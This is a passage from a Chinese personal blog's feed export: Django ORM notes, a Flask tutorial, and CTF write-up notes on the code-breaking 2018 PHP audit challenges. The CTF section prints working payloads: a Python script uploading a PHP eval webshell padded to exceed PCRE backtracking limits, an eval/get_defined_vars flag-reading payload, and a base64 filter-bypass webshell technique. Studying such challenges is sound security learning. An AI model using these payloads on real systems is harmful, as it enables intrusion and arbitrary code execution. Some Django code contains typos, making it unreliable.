class="line"></span><br><span class="line">cursor=connection.cursor()</span><br><span class="line">    cursor.execute(<span class="string">"select * from user"</span>)</span><br><span class="line">    rows = cursor.fetchall()</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> rows:</span><br><span class="line">        print(row)</span><br></pre></td></tr></table></figure><h4 id="PYTHON-DB-API规范下cursor对象常用接口"><a href="#PYTHON-DB-API规范下cursor对象常用接口" class="headerlink" title="PYTHON DB API规范下cursor对象常用接口"></a>PYTHON DB API规范下cursor对象常用接口</h4><ul><li><code>rowcount</code>: 返回执行sql语句后受影响的行数</li><li><code>close</code>: 关闭游标</li><li><p><code>execute(sql[,parameters])</code>:执行sql语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">"select * from user where id=%s"</span>,(<span class="number">2</span>,))</span><br></pre></td></tr></table></figure></li><li><p><code>fetchone</code>:执行查询操作后，获取第一条数据</p></li><li><code>fetchmany(size)</code>: 获取size条数据</li><li><code>fetchall</code>: 获取所有数据 <h3 id="ORM模型"><a href="#ORM模型" class="headerlink" title="ORM模型"></a>ORM模型</h3></li><li><code>ORM</code>: Object Relational Mapping</li><li>ORM映射<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># models.py</span></span><br><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="comment"># id:int类型，自增长</span></span><br><span class="line">    id = models.AutoField(primary_key=<span class="keyword">True</span>)</span><br><span class="line">    <span class="comment"># name: varchar(20),不允许为空</span></span><br><span class="line">    name =models.CharField(max_length=<span class="number">20</span>,null=<span class="keyword">False</span>)</span><br><span class="line">    age = models.IntegerField(null=<span class="keyword">False</span>,default=<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"&lt;Student:(&#123;name&#125;,&#123;age&#125;)&gt;"</span>.format(name=self.name,age=self.age)</span><br><span class="line"><span class="comment"># 使用makemigrations生成迁移脚本文件</span></span><br><span class="line"><span class="comment"># 虚拟环境下在项目路径: python manage.py makemigrations</span></span><br><span class="line"><span class="comment"># 使用migrate将新生成的迁移脚本文件映射到数据库中</span></span><br><span class="line"><span class="comment"># python manage.py migrate</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一个模型的对象，对应数据库表中的一条数据</span></span><br><span class="line"><span class="comment">#student1 =Student(name='chenxiyuan',age=19)</span></span><br><span class="line"><span class="comment"># save方法，将数据保存到数据库</span></span><br><span class="line"><span class="comment">#student1.save()</span></span><br><span class="line"><span class="comment"># delete方法，从数据库中删除这条数据</span></span><br><span class="line"><span class="comment">#student1.delete()</span></span><br></pre></td></tr></table></figure></li></ul><p>要记着在<code>settings.py</code>设置<code>INSTALLED_APPS</code>里安装app，配置好数据库。</p><ul><li>增删改查<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#views.py</span></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Student</span><br><span class="line"><span class="keyword">from</span> django.gttp <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line"><span class="comment">#根据主键进行查找</span></span><br><span class="line">student1 = Student.objects.get(pk=<span class="number">1</span>)</span><br><span class="line">print(student1)</span><br><span class="line"><span class="comment">#&lt;Student:(chenxiyuan,19)&gt;</span></span><br><span class="line"><span class="comment">#根据其他条件进行查找</span></span><br><span class="line">student2 = Student.objects.filter(name=<span class="string">'chenxiyuan'</span>)</span><br><span class="line"><span class="comment"># save方法，将数据保存到数据库</span></span><br><span class="line"><span class="comment">#student1.save()</span></span><br><span class="line"><span class="comment"># delete方法，从数据库中删除这条数据</span></span><br><span class="line"><span class="comment">#student1.delete()</span></span><br><span class="line"><span class="comment">#改就是先查后改再save</span></span><br><span class="line"><span class="keyword">return</span> Httpresponse(<span class="string">"success"</span>)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;搭建虚拟环境&quot;&gt;&lt;a href=&quot;#搭建虚拟环境&quot; class=&quot;headerlink&quot; title=&quot;搭建虚拟环境&quot;&gt;&lt;/a&gt;搭建虚拟环境&lt;/h2&gt;&lt;h3 id=&quot;安装virtualenv&quot;&gt;&lt;a href=&quot;#安装virtualenv&quot; class=&quot;headerlink&quot; title=&quot;安装virtualenv&quot;&gt;&lt;/a&gt;安装virtualenv&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip3 install virtualenv&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;开辟虚拟空间&lt;/p&gt;
&lt;figure class=&quot;highlight cmd&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;virtualenv Django&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#也可以通过-p参数指定python解释器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;virtualenv -p C:\Python27\python.exe [virtualenv name]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;激活虚拟环境&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;linux/mac: source Django/bin/activate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;windows: cd Django/Scripts 执行activate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;退出虚拟环境: deactivate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>code-breaking2018代码审计学习</title>
    <link href="http://chenxiyuan.vip/2019/07/13/code-breaking2018%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chenxiyuan.vip/2019/07/13/code-breaking2018代码审计学习/</id>
    <published>2019-07-13T05:56:12.000Z</published>
    <updated>2019-07-13T10:17:07.986Z</updated>
    
    <content type="html"><![CDATA[<p>我现在这个水平， 每做一道题都会触及到知识盲区，只好看wp做做总结，先拓宽知识储备吧。<br><a href="https://github.com/phith0n/code-breaking" target="_blank" rel="noopener">github地址</a></p><h2 id="easy-–-function"><a href="#easy-–-function" class="headerlink" title="easy – function"></a>easy – function</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题想让我们知道\的作用。php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。<br>然后就可以利用create_function()任意代码执行。<br><a id="more"></a></p><h2 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy pcrewaf"></a>easy pcrewaf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'./data/'</span>;</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题需要了解php的正则回溯机制。<br>正则引擎主要可以分为基本不同的两大类：一种是DFA（确定型有穷自动机），另一种是NFA（不确定型有穷自动机）。简单来讲，NFA 对应的是正则表达式主导的匹配，而DFA对应的是文本主导的匹配。DFA从匹配文本入手，从左到右，每个字符不会匹配两次，它的时间复杂度是多项式的，所以通常情况下，它的速度更快，但支持的特性很少，不支持捕获组、各种引用等等；而NFA则是从正则表达式入手，不断读入字符，尝试是否匹配当前正则，不匹配则吐出字符重新尝试，通常它的速度比较慢，最优时间复杂度为多项式的，最差情况为指数级的。但NFA支持更多的特性，因而绝大多数编程场景下（包括java，js），我们面对的是NFA。<br>pcre.backtrack_limit这个配置决定了在php中，正则引擎回溯的层数。而这个值默认是1000000.<br>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">b'&lt;?php eval($_POST['</span>cxy<span class="string">']);//'</span> + <span class="string">b'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://192.168.91.133:8088//index.php'</span>, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">print(res.headers)</span><br></pre></td></tr></table></figure></p><h2 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">    $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">    $output = shell_exec($command);</span><br><span class="line"></span><br><span class="line">    $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line">    $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">    <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">        file_put_contents($log_name, $output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line"><span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题利用base64编码绕过过滤，然后利用php伪协议解码写入webshell， php解析的时候，会忽略乱码，从&lt;?php开始解析。<br>这里还有一个小trick，在后缀名后加上/.，pathinfo就取不到后缀名，且可以正常写入.php之中。本题$_SERVER[‘SERVER_NAME’]取的是HOST，所以一切都可控了。<br><img src="http://i2.tiimg.com/665720/515bdf159b5c3aab.png" alt="Markdown"><br>刚开始写入文件怎么都是空的，因为base64中的=只能出现在最末尾，而我们插入的字符串是在中间的，所以我们插入的字符串里不能有=，只要把==删除就可以了</p><h2 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只能调用函数，没办法传入字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc: 1=readfile(%27../flag_phpbyp4ss%27);//&amp;code=eval(implode(reset(get_defined_vars())));</span><br></pre></td></tr></table></figure></p><p>implode() 函数返回由数组元素组合成的字符串。<br>reset() 函数将内部指针指向数组中的第一个元素，并输出。<br>get_defined_vars() 返回由所有已定义变量所组成的数组。<br>还有一个巧妙的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我现在这个水平， 每做一道题都会触及到知识盲区，只好看wp做做总结，先拓宽知识储备吧。&lt;br&gt;&lt;a href=&quot;https://github.com/phith0n/code-breaking&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github地址&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;easy-–-function&quot;&gt;&lt;a href=&quot;#easy-–-function&quot; class=&quot;headerlink&quot; title=&quot;easy – function&quot;&gt;&lt;/a&gt;easy – function&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$action = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;action&#39;&lt;/span&gt;] ?? &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$arg = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;arg&#39;&lt;/span&gt;] ?? &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/^[a-z0-9_]*$/isD&#39;&lt;/span&gt;, $action)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    show_source(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $action(&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, $arg);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这道题想让我们知道\的作用。php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。&lt;br&gt;然后就可以利用create_function()任意代码执行。&lt;br&gt;
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ctf" scheme="http://chenxiyuan.vip/tags/ctf/"/>
    
      <category term="代码审计" scheme="http://chenxiyuan.vip/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>flask框架学习</title>
    <link href="http://chenxiyuan.vip/2019/07/09/flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chenxiyuan.vip/2019/07/09/flask框架学习/</id>
    <published>2019-07-09T11:35:11.000Z</published>
    <updated>2019-07-16T06:35:24.236Z</updated>
    
    <content type="html"><![CDATA[<h2 id="搭建虚拟环境"><a href="#搭建虚拟环境" class="headerlink" title="搭建虚拟环境"></a>搭建虚拟环境</h2><p>安装virtualenv<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install virtualenv</span><br></pre></td></tr></table></figure></p><p>开辟虚拟空间<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv flask-env</span><br></pre></td></tr></table></figure></p><p>激活虚拟环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux/mac: source flask-env/bin/activate</span><br><span class="line">windows: cd flask-env/Scripts 执行activate</span><br><span class="line">退出虚拟环境: deactivate</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>虚拟环境安装flask<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install flask</span><br></pre></td></tr></table></figure></p><h2 id="创建flask项目"><a href="#创建flask项目" class="headerlink" title="创建flask项目"></a>创建flask项目</h2><p>我用pycharm创建一个flask项目，interpreter要选择自己的虚拟环境里的python.exe。然后就成功生成一个简单的模板。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask  <span class="comment">#从flask这个框架中导入Flask这个类</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化一个Flask对象</span></span><br><span class="line"><span class="comment"># Flask()</span></span><br><span class="line"><span class="comment"># 需要传递一个参数__name__</span></span><br><span class="line"><span class="comment"># 1.方便flask框架去寻找资源</span></span><br><span class="line"><span class="comment"># 2.方便flask插件比如Flask-Sqlalchemy出现错误的时候，找到问题所在的位置</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># @app.route 是一个装饰器</span></span><br><span class="line"><span class="comment"># @开头,并且在函数的上面，说明是装饰器</span></span><br><span class="line"><span class="comment"># 这个装饰器的作用，是做一个url与视图函数的映射</span></span><br><span class="line"><span class="comment"># 127.0.0.1:5000/  -&gt;去请求hello_world这个函数，然后将请求结果返回给浏览器</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello chenxiyuan"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 若果当前文件是作为入口程序运行，那么就执行app.run()</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># app,run()</span></span><br><span class="line"><span class="comment"># 启动一个应用服务器，来接受用户的请求</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment"># listen()</span></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure></p><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>debug模式,在pycharm里启动配置中要勾选FLASK_DEBUG<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p><h3 id="使用配置文件"><a href="#使用配置文件" class="headerlink" title="使用配置文件"></a>使用配置文件</h3><p>新建config.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEBUG = True</span><br></pre></td></tr></table></figure></p><p>主程序<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(config)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello world"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p><h3 id="url传参数"><a href="#url传参数" class="headerlink" title="url传参数"></a>url传参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/a/&lt;id&gt;') #参数放在&lt;&gt;中</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(id)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u"您请求的参数是：%s"</span> % id</span><br></pre></td></tr></table></figure><h3 id="url反转"><a href="#url反转" class="headerlink" title="url反转"></a>url反转</h3><p>url_for函数，视图函数的名称作为参数，返回视图函数的url。<br><figure class="highlight python"><table><tr><td 